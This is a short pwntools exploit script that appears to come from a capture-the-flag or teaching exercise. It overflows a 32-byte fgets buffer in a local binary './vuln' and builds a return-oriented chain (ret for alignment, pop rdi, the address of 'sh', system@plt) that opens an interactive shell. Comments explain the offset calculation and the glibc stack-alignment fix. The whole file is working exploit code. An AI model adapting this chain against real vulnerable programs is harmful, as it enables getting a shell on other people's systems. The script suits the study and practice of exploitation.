#!/usr/bin/env python3

from pwn import *

binary = "./vuln"
context.binary = binary
#context.log_level = "debug"

e = ELF(binary)
# XXX: We need to add 4 to the PLT address returned by pwntools on ELF files.
system_plt_address = e.plt[b"system"] + 4
sh_address = e.symbols[b"sh"]
log.info("plt_address: 0x{:016x}".format(system_plt_address))
log.info("sh: 0x{:016x}".format(sh_address))

r = ROP(e)
pop_rdi_ret = r.find_gadget(["pop rdi", "ret"]).address
ret = r.find_gadget(["ret"]).address

# The offset from buffer to return address is determined by static analysis.
#
#  400597:       48 8d 45 e0             lea    rax,[rbp-0x20]
#  40059b:       be 80 00 00 00          mov    esi,0x80
#  4005a0:       48 89 c7                mov    rdi,rax
#  4005a3:       e8 d8 fe ff ff          call   400480 <fgets@plt>
#
# The buffer is at rbp-0x20. The return address is at rbp+0x8. So the
# offset is rbp+0x8-(rbp-0x20) = 0x28
offset = 0x28

# Add a ret gadget that does nothing helpful (it simply jumps to the next
# address) to fix issue with stack alignment in do_system() for glibc 2.27:
# => 0x7f14bef6c2f6 <do_system+1094>:     movaps XMMWORD PTR [rsp+0x40],xmm0
payload = offset * b"A" + pack(ret) + pack(pop_rdi_ret) + pack(sh_address) + pack(system_plt_address)
log.info("payload: " + "".join("\\x{:02x}".format(i) for i in payload))

io = process(binary)
#gdb.attach(io)
io.sendline(payload)
io.interactive()
